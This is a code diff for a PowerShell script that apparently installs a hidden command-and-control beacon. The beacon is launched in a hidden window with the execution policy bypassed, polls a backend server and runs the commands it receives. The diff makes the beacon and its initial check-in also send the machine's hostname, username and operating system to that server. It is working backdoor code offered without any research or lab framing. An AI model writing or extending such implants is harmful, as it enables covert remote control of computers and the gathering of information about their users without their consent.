@@ -23,7 +23,17 @@ $BeaconScript = @"
 
 while (`$true) {
     try {
-        `$beaconBody = @{id = `$AGENT_ID} | ConvertTo-Json
+        `$hostname = `$env:COMPUTERNAME
+        `$username = `$env:USERNAME
+        `$os = (Get-WmiObject Win32_OperatingSystem).Caption
+        
+        `$beaconBody = @{
+            id = `$AGENT_ID
+            hostname = `$hostname
+            username = `$username
+            os = `$os
+        } | ConvertTo-Json
+        
         `$response = Invoke-RestMethod -Uri "`$BACKEND_URL/beacon" -Method Post -ContentType 'application/json' -Body `$beaconBody -TimeoutSec 30
         
         if (`$response.command -and `$response.commandId) {
@@ -78,7 +88,17 @@ try {
 Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`"" -WindowStyle Hidden
 
 try {
-    $initialBeacon = @{id = $AGENT_ID} | ConvertTo-Json
+    $hostname = $env:COMPUTERNAME
+    $username = $env:USERNAME
+    $os = (Get-WmiObject Win32_OperatingSystem).Caption
+    
+    $initialBeacon = @{
+        id = $AGENT_ID
+        hostname = $hostname
+        username = $username
+        os = $os
+    } | ConvertTo-Json
+    
     Invoke-RestMethod -Uri "$BACKEND_URL/beacon" -Method Post -ContentType 'application/json' -Body $initialBeacon -TimeoutSec 30 | Out-Null
 } catch {}
 
